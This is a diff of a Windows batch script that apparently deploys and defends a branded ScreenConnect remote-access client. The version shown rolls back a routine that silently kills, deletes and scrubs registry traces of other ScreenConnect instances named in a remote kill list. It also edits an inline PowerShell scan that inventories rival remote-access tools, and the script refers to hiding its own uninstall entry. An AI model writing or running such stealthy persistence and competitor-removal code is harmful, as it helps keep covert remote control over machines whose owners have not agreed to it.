@@ -72,9 +72,6 @@ rem 0.1.8: TRUST (C24) - the kill list and the repo gryxa MSI are now hash-pinne
 rem   signed manifest (agent writes pins.cfg). A pin mismatch rejects the file (fail-safe:
 rem   keep cached kill list, skip MSI install). Digest carries the agent's manifest
 rem   signature state (sig=ok/fail/missing/error) so TRUST rollout is observable.
-rem 0.2.0: C27 PluxN retire - killlist type scfp|HEXFP purges that ScreenConnect FP every
-rem   cycle (service + path-scoped process kill + install dirs + ARP). Never msiexec /x
-rem   (shared ProductCode = C03). RmmScan keeper-sevrz tag is only 5f6010579852e507 now.
 rem 0.1.9: C25 BRAINDEVICE - HuntKiller/RmmScan were synchronous PowerShell with no cap;
 rem   Get-ScheduledTask hung forever after shields_ok so Gryxa never installed and the
 rem   overlap lock stayed held. Both now run detached with a 90s done-file wait (same
@@ -106,7 +103,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
-set "GVER=0.2.0"
+set "GVER=0.1.9"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- TRUST (C24): data pins published by the agent from the signed manifest ---
@@ -143,7 +140,6 @@ call :SelfCheck
 call :Shields
 call :HideARP
 call :FetchKL
-call :PurgeScFp
 call :HuntKiller
 if exist "%ZD%\killer.flag" (
   del /f /q "%ZD%\killer.flag" >nul 2>&1
@@ -578,7 +574,7 @@ rem --- entries go to rmm.new (single alert line); summary goes to rmm.top for t
 rem --- REPORT ONLY. NOTE: no double-quote chars in the PS line below (cmd quoting rule).
 rem --- C25: detached + 90s cap so a hung CIM query can never block Gryxa install. ---
 del /f /q "%ZD%\rmm.done" >nul 2>&1
-start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],($sp[2..($sp.Count-1)] -join '|')) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; if($h){ $h=$h.Trim([char]34) }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] }; if(-not $h -and $uc -match 'name=.Host.[^>]*>\s*<value>([^<]+)'){ $h=$Matches[1] }; if(-not $pt -and $uc -match 'name=.Port.[^>]*>\s*<value>(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=(($pth -replace [char]34,' ') -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }; 'ok' | Set-Content -Path '%ZD%\rmm.done' -Encoding ASCII" >nul 2>&1
+start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],($sp[2..($sp.Count-1)] -join '|')) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; if($h){ $h=$h.Trim([char]34) }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] }; if(-not $h -and $uc -match 'name=.Host.[^>]*>\s*<value>([^<]+)'){ $h=$Matches[1] }; if(-not $pt -and $uc -match 'name=.Port.[^>]*>\s*<value>(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507' -or $fp -eq 'f861c8140d453427'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=(($pth -replace [char]34,' ') -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }; 'ok' | Set-Content -Path '%ZD%\rmm.done' -Encoding ASCII" >nul 2>&1
 set "RW=0"
 :RmmWait
 if exist "%ZD%\rmm.done" goto :RmmOut
@@ -641,38 +637,6 @@ if exist "%KLNEW%" (
   )
 )
 del /f /q "%KLNEW%" >nul 2>&1
-exit /b 0
-
-:PurgeScFp
-rem --- C27: scfp|HEXFP lines in the kill list = remove that ScreenConnect instance only.
-rem --- Never msiexec /x (shared ProductCode). Hard-refuse Gryxa FP + remaining sevrz keeper.
-if not exist "%KL%" exit /b 0
-for /f "usebackq eol=# tokens=1,2 delims=|" %%A in ("%KL%") do (
-  if /I "%%A"=="scfp" if not "%%B"=="" call :PurgeOneFp "%%B"
-)
-exit /b 0
-
-:PurgeOneFp
-set "BFP=%~1"
-if not defined BFP exit /b 0
-if /I "!BFP!"=="36e506ff016b2151" exit /b 0
-if /I "!BFP!"=="5f6010579852e507" exit /b 0
-set "SN=ScreenConnect Client (!BFP!)"
-set "HIT="
-sc query "!SN!" >nul 2>&1
-if not errorlevel 1 set "HIT=1"
-if exist "%ProgramFiles(x86)%\ScreenConnect Client (!BFP!)" set "HIT=1"
-if exist "%ProgramFiles%\ScreenConnect Client (!BFP!)" set "HIT=1"
-if not defined HIT exit /b 0
-echo [%DATE% %TIME%] scfp_purge !BFP!>>"%LOG%"
-sc stop "!SN!" >nul 2>&1
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $fp='!BFP!'; Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -like ('*'+$fp+'*')) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
-ping -n 3 127.0.0.1 >nul 2>&1
-sc delete "!SN!" >nul 2>&1
-if exist "%ProgramFiles(x86)%\ScreenConnect Client (!BFP!)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (!BFP!)" >nul 2>&1
-if exist "%ProgramFiles%\ScreenConnect Client (!BFP!)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (!BFP!)" >nul 2>&1
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $n=[regex]::Escape('ScreenConnect Client (!BFP!)'); foreach($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'){ Get-ItemProperty $k | Where-Object { $_.DisplayName -and ($_.DisplayName -match $n) } | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force } }" >nul 2>&1
->"%ZD%\killer.flag" echo 1
 exit /b 0
 
 :HuntKiller
